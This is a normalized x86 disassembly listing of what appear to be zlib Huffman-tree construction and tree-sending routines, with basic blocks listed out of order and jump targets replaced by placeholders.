mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x18 ] 0xffffffff
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1448 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x144c ] 0x23d
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
cmp edx [ ebp - 0x8 ]
jge r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x1448 ] 0x2
jge r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 ]
test edx edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1448 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
jge r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + eax * 4 + 0x2 ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1448 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov [ edx + 0x1450 ] 0x0
jmp r-xdata
cmp [ ebp - 0x1c ] 0x1
jl r-xdata
mov [ ebp - 0x20 ] 0x0
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40868e
add esp 0xc
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x2 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a4 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1448 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ ecx + eax * 4 + 0xb54 ] edx
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 ] 0x1
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0x1450 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a0 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a0 ] edx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax + 0x1450 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
xor edx edx
mov dl [ ecx + 0x1450 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb58 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + eax * 4 + 0xb54 ]
mov [ ecx + 0xb58 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1448 ] edx
push 0x1
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40868e
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb58 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x144c ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x144c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x144c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ ecx + eax * 4 + 0xb54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x144c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ edx + ecx * 4 + 0xb54 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
xor esi esi
mov si [ edx + ecx * 4 ]
add eax esi
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 ] ax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
xor ecx ecx
mov cl [ eax + 0x1450 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx + 0x1450 ]
cmp ecx eax
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x144c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xb58 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40882d
add esp 0x8
mov ecx [ ebp + 0x8 ]
add ecx 0xb34
push ecx
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
call sub_408b60
add esp 0xc
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x24 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0x1450 ] dl
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x2 ] ax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x2 ] ax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0xb58 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
push 0x1
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40868e
add esp 0xc
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1448 ] 0x2
jge r-xdata
sub_40868e
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb54 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
shl eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0xb54 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x1448 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + eax * 4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0xc ]
xor esi esi
mov si [ ecx + eax * 4 ]
cmp edx esi
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xb58 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0xb54 ]
mov edx [ ebp + 0xc ]
xor esi esi
mov si [ edx + ecx * 4 ]
cmp eax esi
jl r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + edx * 4 + 0xb54 ]
mov eax [ ebp + 0xc ]
xor esi esi
mov si [ eax + edx * 4 ]
cmp ecx esi
jne r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb58 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + edx * 4 + 0xb54 ]
mov eax [ ebp + 0xc ]
xor esi esi
mov si [ eax + edx * 4 ]
cmp ecx esi
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0xb54 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x1450 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov bl [ ecx + eax + 0x1450 ]
cmp edx ebx
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xb58 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + eax + 0x1450 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov bl [ ecx + eax + 0x1450 ]
cmp edx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x1448 ]
jg r-xdata
sub_40882d
push ebp
mov ebp esp
sub esp 0x34
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
cmp [ ebp - 0x18 ] 0xf
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xb54 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 + 0x2 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0xb34 ] 0x0
jmp r-xdata
cmp [ ebp - 0x20 ] 0x23d
jge r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb54 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x2 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x8 ]
jle r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x10 ]
mov cx [ ebp - 0x18 ]
mov [ eax + edx * 4 + 0x2 ] cx
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x34 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 2 + 0xb34 ]
sub dx 0x1
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 2 + 0xb34 ] dx
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 2 + 0xb36 ]
add cx 0x2
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0xb36 ] cx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 2 + 0xb34 ]
sub ax 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 2 + 0xb34 ] ax
mov eax [ ebp - 0xc ]
sub eax 0x2
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jg r-xdata
mov edx [ ebp - 0x18 ]
sub edx 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 2 + 0xb34 ]
add dx 0x1
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 2 + 0xb34 ] dx
mov [ ebp - 0x24 ] 0x0
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x2c ]
jl r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 2 + 0xb34 ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ecx + eax * 4 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x24 ]
imul eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x16a0 ]
add ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x24 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
xor esi esi
mov si [ edx + ecx * 4 + 0x2 ]
add esi [ ebp - 0x24 ]
imul eax esi
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a4 ]
add edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a4 ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 2 + 0xb34 ]
mov [ ebp - 0x30 ] edx
jmp r-xdata
mov eax [ ebp - 0x20 ]
sub eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xb54 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x34 ]
jle r-xdata
mov edx [ ebp - 0x18 ]
sub edx 0x1
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x30 ]
sub eax 0x1
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
mov edx [ ebp - 0x18 ]
sub edx ecx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
xor esi esi
mov si [ ecx + eax * 4 ]
imul edx esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16a0 ]
add ecx edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] ecx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ebp - 0x18 ]
mov [ ecx + eax * 4 + 0x2 ] dx
cmp [ ebp - 0x30 ] 0x0
je r-xdata
sub_408b60
push ebp
mov ebp esp
sub esp 0x34
push esi
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0xf
jg r-xdata
mov [ ebp - 0x2c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x28 ]
and ecx 0xffff
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
xor esi esi
mov si [ eax + edx * 2 - 0x2 ]
add ecx esi
shl ecx 0x1
mov [ ebp - 0x28 ] cx
mov ecx [ ebp - 0x4 ]
mov dx [ ebp - 0x28 ]
mov [ ebp + ecx * 2 - 0x24 ] dx
jmp r-xdata
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x30 ]
xor ecx ecx
mov cx [ ebp + eax * 2 - 0x24 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x34 ]
push edx
mov eax [ ebp - 0x30 ]
mov cx [ ebp + eax * 2 - 0x24 ]
add cx 0x1
mov edx [ ebp - 0x30 ]
mov [ ebp + edx * 2 - 0x24 ] cx
call sub_40a89c
add esp 0x8
mov ecx [ ebp - 0x2c ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] ax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x1
mov [ ebp - 0x2c ] eax
sub_408c25
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb14 ]
push ecx
mov edx [ ebp + 0x8 ]
add edx 0x8c
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_408cdc
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xb20 ]
push edx
mov eax [ ebp + 0x8 ]
add eax 0x980
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_408cdc
add esp 0xc
mov edx [ ebp + 0x8 ]
add edx 0xb28
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4082ee
add esp 0x8
mov [ ebp - 0x4 ] 0x12
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jl r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
imul eax eax 0x3
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a0 ]
lea eax [ edx + eax + 0xe ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a0 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + r--data ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0xa76 ]
test edx edx
je r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_408cdc
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x18 ] 0xffffffff
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x2 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax + edx * 4 + 0x6 ] 0xffff
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
mov edx [ ebp - 0x1c ]
cmp edx [ ebp + 0x10 ]
jg r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x6 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 4 + 0xa74 ]
add cx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0xa74 ] cx
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0xa
jg r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xabc ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xabc ] dx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xab8 ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xab8 ] dx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xab4 ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xab4 ] dx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 4 + 0xa74 ]
add cx 0x1
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0xa74 ] cx
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x6
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
sub_408e79
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x8 ] 0x5
mov eax 0x10
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp + 0xc ]
sub edx 0x101
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0xc ]
sub edx 0x101
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0xc ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x8 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x10 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
